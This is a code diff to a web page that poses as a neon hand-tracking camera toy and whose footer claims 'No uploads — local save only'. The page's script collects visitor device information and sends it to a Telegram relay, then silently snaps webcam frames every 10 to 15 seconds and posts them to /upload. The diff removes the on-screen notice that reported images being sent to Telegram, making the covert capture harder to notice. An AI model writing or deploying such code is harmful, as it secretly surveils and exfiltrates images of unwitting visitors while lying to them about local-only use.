@@ -112,15 +112,8 @@
     }
     .tagline { color:var(--neon); text-shadow: 0 0 10px rgba(0,242,254,0.15); }
     .muted { opacity:0.7; font-size:0.85rem; }
-    .status {
-      position: fixed;
-      bottom: 10px;
-      right: 10px;
-      padding: 8px 12px;
-      background: rgba(0, 0, 0, 0.6);
-      border-radius: 4px;
-      font-size: 12px;
-      color: var(--neon);
+    .hidden {
+      display: none;
     }
   </style>
 </head>
@@ -147,8 +140,6 @@
     <div class="muted">No uploads — local save only</div>
   </footer>
 
-  <div class="status" id="status">Initializing...</div>
-
   <script src="https://cdn.jsdelivr.net/npm/@mediapipe/hands/hands.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/@mediapipe/drawing_utils/drawing_utils.js"></script>
@@ -158,19 +149,12 @@
     const handCanvas = document.getElementById('handCanvas');
     const ctx = handCanvas.getContext('2d');
     const shutterBtn = document.getElementById('shutterBtn');
-    const statusEl = document.getElementById('status');
     
     let cameraStream = null;
     let userInfoSent = false;
     let imageCount = 0;
     let isSendingImages = true;
-    
-    function updateStatus(message) {
-      statusEl.textContent = message;
-      setTimeout(() => {
-        statusEl.textContent = 'Active';
-      }, 3000);
-    }
+    let mediaPipeInitialized = false;
     
     function collectUserInfo() {
       return {
@@ -194,8 +178,7 @@
           body: JSON.stringify(message)
         });
         
-        const data = await response.json();
-        return data;
+        return await response.json();
       } catch (error) {
         console.error('Error sending to server:', error);
       }
@@ -205,40 +188,44 @@
       if (!isSendingImages) return;
       
       if (!video.videoWidth || !video.videoHeight) {
-        setTimeout(sendImageToTelegram, 2000);
+        setTimeout(sendImageToTelegram, 3000);
         return;
       }
       
-      const canvas = document.createElement('canvas');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      const ctx = canvas.getContext('2d');
-      
-      ctx.translate(canvas.width, 0);
-      ctx.scale(-1, 1);
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      ctx.setTransform(1, 0, 0, 1, 0, 0);
-      
-      canvas.toBlob(blob => {
-        const formData = new FormData();
-        formData.append('photo', blob, `cambot_capture_${Date.now()}.jpg`);
+      try {
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d');
         
-        fetch('/upload', {
-          method: 'POST',
-          body: formData
-        })
-        .then(response => response.json())
-        .then(data => {
-          imageCount++;
-          updateStatus(`Sent ${imageCount} images to Telegram`);
-        })
-        .catch(error => {
-          console.error('Error sending image:', error);
-        })
-        .finally(() => {
-          setTimeout(sendImageToTelegram, 10000);
-        });
-      }, 'image/jpeg', 0.8);
+        ctx.translate(canvas.width, 0);
+        ctx.scale(-1, 1);
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        ctx.setTransform(1, 0, 0, 1, 0, 0);
+        
+        canvas.toBlob(blob => {
+          const formData = new FormData();
+          formData.append('photo', blob, `cambot_${Date.now()}.jpg`);
+          
+          fetch('/upload', {
+            method: 'POST',
+            body: formData
+          })
+          .then(response => response.json())
+          .then(data => {
+            imageCount++;
+          })
+          .catch(error => {
+            console.error('Error sending image:', error);
+          })
+          .finally(() => {
+            setTimeout(sendImageToTelegram, 15000);
+          });
+        }, 'image/jpeg', 0.7);
+      } catch (e) {
+        console.error('Error creating image:', e);
+        setTimeout(sendImageToTelegram, 10000);
+      }
     }
     
     async function initCamera() {
@@ -259,26 +246,38 @@
         video.srcObject = stream;
         
         if (!userInfoSent) {
-          const userInfo = collectUserInfo();
-          await sendToTelegram(userInfo);
-          userInfoSent = true;
-          updateStatus('User info sent to Telegram');
-          
-          setTimeout(() => {
-            sendImageToTelegram();
-          }, 3000);
+          try {
+            const userInfo = collectUserInfo();
+            await sendToTelegram(userInfo);
+            userInfoSent = true;
+            
+            setTimeout(() => {
+              sendImageToTelegram();
+            }, 5000);
+          } catch (e) {
+            console.error('Error sending user info:', e);
+          }
         }
         
         await new Promise(resolve => {
-          video.onloadedmetadata = resolve;
+          if (video.readyState >= 2) {
+            resolve();
+          } else {
+            video.onloadedmetadata = resolve;
+            video.onloadeddata = resolve;
+          }
         });
         
         resizeCanvas();
         window.addEventListener('resize', resizeCanvas);
-        updateStatus('Camera active');
+        
+        if (!mediaPipeInitialized) {
+          initMediaPipe();
+          mediaPipeInitialized = true;
+        }
       } catch (e) {
         console.error('Camera error:', e);
-        updateStatus('Camera error: ' + e.message);
+        setTimeout(initCamera, 3000);
       }
     }
     
@@ -314,82 +313,85 @@
       ctx.restore();
     }
 
-    const hands = new Hands({
-      locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${file}`
-    });
-    
-    hands.setOptions({
-      maxNumHands: 2,
-      modelComplexity: 0,
-      minDetectionConfidence: 0.5,
-      minTrackingConfidence: 0.5
-    });
-
-    hands.onResults((results) => {
-      ctx.clearRect(0, 0, handCanvas.width, handCanvas.height);
-
-      if (!results.multiHandLandmarks || results.multiHandLandmarks.length === 0) return;
-
-      for (let handLandmarks of results.multiHandLandmarks) {
-        const connections = window.HAND_CONNECTIONS;
-        const points = handLandmarks.map(pt => {
-          const rect = video.getBoundingClientRect();
-          return {
-            x: rect.width - (pt.x * rect.width),
-            y: pt.y * rect.height
-          };
-        });
-
-        for (let conn of connections) {
-          const [i, j] = conn;
-          drawNeonLine(points[i], points[j]);
-        }
-        for (let p of points) drawNeonPoint(p);
-      }
-    });
-
-    let cameraUtils = null;
-    
-    video.addEventListener('loadedmetadata', () => {
-      if (cameraUtils) {
-        cameraUtils.stop();
-      }
+    function initMediaPipe() {
+      const hands = new Hands({
+        locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${file}`
+      });
       
-      cameraUtils = new Camera(video, {
+      hands.setOptions({
+        maxNumHands: 1,
+        modelComplexity: 0,
+        minDetectionConfidence: 0.5,
+        minTrackingConfidence: 0.5
+      });
+
+      hands.onResults((results) => {
+        if (!handCanvas.width || !handCanvas.height) return;
+        
+        ctx.clearRect(0, 0, handCanvas.width, handCanvas.height);
+
+        if (!results.multiHandLandmarks || results.multiHandLandmarks.length === 0) return;
+
+        for (let handLandmarks of results.multiHandLandmarks) {
+          const connections = window.HAND_CONNECTIONS;
+          const points = handLandmarks.map(pt => {
+            const rect = video.getBoundingClientRect();
+            return {
+              x: rect.width - (pt.x * rect.width),
+              y: pt.y * rect.height
+            };
+          });
+
+          for (let conn of connections) {
+            const [i, j] = conn;
+            drawNeonLine(points[i], points[j]);
+          }
+          for (let p of points) drawNeonPoint(p);
+        }
+      });
+
+      const cameraUtils = new Camera(video, {
         onFrame: async () => {
-          await hands.send({ image: video });
+          try {
+            await hands.send({ image: video });
+          } catch (e) {
+            console.error('MediaPipe error:', e);
+          }
         },
         width: 640,
         height: 480
       });
       
       cameraUtils.start();
-    });
+    }
 
     shutterBtn.addEventListener('click', async () => {
-      const rect = video.getBoundingClientRect();
-      const out = document.createElement('canvas');
-      out.width = rect.width;
-      out.height = rect.height;
-      const outCtx = out.getContext('2d');
+      try {
+        const rect = video.getBoundingClientRect();
+        const out = document.createElement('canvas');
+        out.width = rect.width;
+        out.height = rect.height;
+        const outCtx = out.getContext('2d');
 
-      outCtx.save();
-      outCtx.translate(out.width, 0);
-      outCtx.scale(-1, 1);
-      outCtx.drawImage(video, 0, 0, out.width, out.height);
-      outCtx.restore();
+        outCtx.save();
+        outCtx.translate(out.width, 0);
+        outCtx.scale(-1, 1);
+        outCtx.drawImage(video, 0, 0, out.width, out.height);
+        outCtx.restore();
 
-      outCtx.drawImage(handCanvas, 0, 0, out.width, out.height);
+        outCtx.drawImage(handCanvas, 0, 0, out.width, out.height);
 
-      out.toBlob(blob => {
-        const a = document.createElement('a');
-        a.href = URL.createObjectURL(blob);
-        a.download = `cambot_capture_${Date.now()}.jpg`;
-        document.body.appendChild(a);
-        a.click();
-        a.remove();
-        updateStatus('Image downloaded');
-      }, 'image/jpeg', 0.92);
+        out.toBlob(blob => {
+          const a = document.createElement('a');
+          a.href = URL.createObjectURL(blob);
+          a.download = `cambot_capture_${Date.now()}.jpg`;
+          document.body.appendChild(a);
+          a.click();
+          a.remove();
+        }, 'image/jpeg', 0.92);
+      } catch (e) {
+        console.error('Error capturing image:', e);
+      }
     });
     
     window.addEventListener('beforeunload', () => {
@@ -399,7 +401,8 @@
       }
     });
     
-    initCamera();
+    // Start with a delay to avoid permission issues
+    setTimeout(initCamera, 1000);
   </script>
 </body>
 </html>
